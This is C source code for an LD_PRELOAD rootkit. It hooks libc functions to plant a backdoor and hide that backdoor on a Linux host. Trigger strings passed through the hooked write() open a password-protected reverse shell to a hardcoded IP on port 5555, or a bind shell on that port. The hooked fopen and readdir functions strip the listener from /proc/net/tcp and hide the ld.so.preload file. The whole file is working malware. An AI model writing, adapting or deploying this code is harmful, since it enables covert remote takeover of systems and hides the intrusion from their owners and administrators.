//libraries
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>

#define REVTRIGGER "plsrev" //  presence of this string will trigger the REV Shell
#define BINDTRIGGER "plsbind" // presence of this string will trigger the BIND Shell
#define PASS "letmein" // password for shell access
#define PORT "5555" // port to listen on / connect to
#define HEXPORT "15B3" // hex value reflected in netstat
#define FILENAME "ld.so.preload"
#define IP "10.2.148.1" // IP to connect to


/* I KEEP FORGETING THIS :

    struct addrinfo {
	int              ai_flags;     // AI_PASSIVE, AI_CANONNAME, etc.
	int              ai_family;    // AF_INET, AF_INET6, AF_UNSPEC
	int              ai_socktype;  // SOCK_STREAM, SOCK_DGRAM
	int              ai_protocol;  // use 0 for "any"
	size_t           ai_addrlen;   // size of ai_addr in bytes
	struct sockaddr *ai_addr;      // struct sockaddr_in or _in6
	char            *ai_canonname; // full canonical hostname

	struct addrinfo *ai_next;      // linked list, next node
    };

    int getaddrinfo(const char *node,     // e.g. "www.example.com" or IP
			const char *service,  // e.g. "http" or port number
			const struct addrinfo *hints,
			struct addrinfo **res);
*/

int ip_rev(void)
{
	int s;
	if((s=socket(AF_INET,SOCK_STREAM,0))==-1)
	{
		//perror("[-] Error Creating Socket Descriptor\n");		
		return -1;
	}

	int optval=1;
	if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&optval,sizeof(optval))==-1)
	{
		//perror("[-] Error in setsockopt()\n");
		return -2;
	}

	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof(hints));

	hints.ai_family = AF_UNSPEC;  // use IPv4 or IPv6, whichever
	hints.ai_socktype = SOCK_STREAM;
	getaddrinfo(IP, PORT, &hints, &res);

	int flag =0;
	while(connect(s,res->ai_addr,res->ai_addrlen) != 0)
	{
		sleep(1);
		flag = flag+1;
		if(flag > 5)
			return -3;
	}

	dup2(s, 0);
	dup2(s, 1);
	dup2(s, 2);

	char input[30];
	read(s, input, sizeof(input)); // Read Input Stream For Password

	if (strncmp(input,PASS,strlen(PASS))==0)
	{
	    char *shell[2];
	    shell[0]="/bin/sh";
	    shell[1]=NULL;
	    execve(shell[0],shell, NULL); // Call Our Shell
	    close(s);
	    return 0;
	}
	else
	{
	    shutdown(s,SHUT_RDWR); // Shutdown Further R/W Operation From Client
	    close(s);
	    return -4;
	}
}

int ip_bind(void)
{	
	int s;
	if ((s=socket(AF_INET,SOCK_STREAM,0))==-1) // Create Socket FD
	{
		//perror("[-] Error Creating Socket Descriptor\n");		
		return -1;
	}

	int optval=1;
	if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&optval,sizeof(optval))==-1) // Allow reusability of the socket
	{
		//perror("[-] Error in setsockopt()\n");
		return -2;
	}

	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof(hints)); // Zero out the garbage values in memory
	hints.ai_family = AF_UNSPEC;  // Use IPv4 or IPv6, whichever
	hints.ai_socktype = SOCK_STREAM; // TCP
	hints.ai_flags = AI_PASSIVE;     // Fill in my IP for me
	
	getaddrinfo(NULL, PORT, &hints, &res); // Fill the structure	

	if((bind(s,res->ai_addr,res->ai_addrlen))==-1)
	{
		//perror("[+] Failed To Bind Port \n");
		return -3;	
	}

	if(listen(s,5) == -1) // Listen On The Specified Port With a backlog of 5
	{
	    //perror("[-] Could Not Listen\n");
		return -4;
	}

	int conn_fd; // FD for client connections
	
	// accept(sock, (struct sockaddr *) &client_address, &client_length); can also be done but I dont want my IP to be known to the server	
	conn_fd = accept(s, NULL, NULL);
	if(conn_fd == -1)
	{
		//perror("[-] Could Not Accept Connection\n");
		exit(-5);
	}	

    dup2(conn_fd, 0);
    dup2(conn_fd, 1);
    dup2(conn_fd, 2);

    char input[30];
    read(conn_fd, input, sizeof(input)); // Read Input Stream For Password
    if (strncmp(input,PASS,strlen(PASS))==0)
    {
    	char *shell[2];
    	shell[0]="/bin/sh";
    	shell[1]=NULL;
    	execve(shell[0],shell, NULL); // Call Our Shell
    	close(s);
    	return 0;
    }
    
    else
    {
    	shutdown(conn_fd,SHUT_RDWR); // Shutdown Further R/W Operation From Client
    	close(s);
    	return -5;
    }
}

ssize_t write(int fildes, const void *buf, size_t nbytes) // From Manual
{
	ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes); // Create A New Function Pointer
	ssize_t result;

	new_write = dlsym(RTLD_NEXT, "write"); // Find the next occurrence of the desired symbol in the search order after the current object
	
	if (strstr(buf,BINDTRIGGER) != NULL) // Check If A Particular String Is Present In The ind Shell And Trigger Accordingly
	{
		fildes = open("/dev/null", O_WRONLY | O_APPEND);
		result = new_write(fildes,buf,nbytes);
		ip_bind();
	}
	else if(strstr(buf,REVTRIGGER) != NULL)
	{
		fildes = open("/dev/null", O_WRONLY | O_APPEND);
		result = new_write(fildes,buf,nbytes);
		ip_rev();	
	}
	else
	{
		result = new_write(fildes, buf, nbytes);
	}
	return result;
}

FILE *fopen(const char *pathname, const char *mode)
{
	FILE *(*orig_fopen)(const char *pathname, const char *mode);
	orig_fopen=dlsym(RTLD_NEXT,"fopen");
	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		FILE *temp = tmpfile();
		fp = orig_fopen(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, HEXPORT);
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;
	}
	
	fp = orig_fopen(pathname, mode);
	return fp;
}


FILE *fopen64(const char *pathname, const char *mode)
{
	FILE *(*orig_fopen64)(const char *pathname, const char *mode);
	orig_fopen64=dlsym(RTLD_NEXT,"fopen64");
	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		FILE *temp64 = tmpfile64();
		fp = orig_fopen64(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, HEXPORT);
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp64);
			}
		}			
		return temp64;
	}
	
	fp = orig_fopen64(pathname, mode);
	return fp;
}

struct dirent *readdir(DIR *dirp)
{
	struct dirent *(*new_readdir)(DIR *dir);
	new_readdir=dlsym(RTLD_NEXT,"readdir");
	struct dirent *olddir;

	while(olddir = new_readdir(dirp))
	{
		if(strstr(olddir->d_name,FILENAME) == 0)
			break;
	}
	return olddir;
}

struct dirent64 *readdir64(DIR *dirp)
{
	struct dirent64 *(*new_readdir64)(DIR *dir);
	new_readdir64=dlsym(RTLD_NEXT,"readdir64");
	struct dirent64 *olddir;

	while(olddir = new_readdir64(dirp))
	{
		if(strstr(olddir->d_name,FILENAME) == 0)
			break;
	}
	return olddir;
}
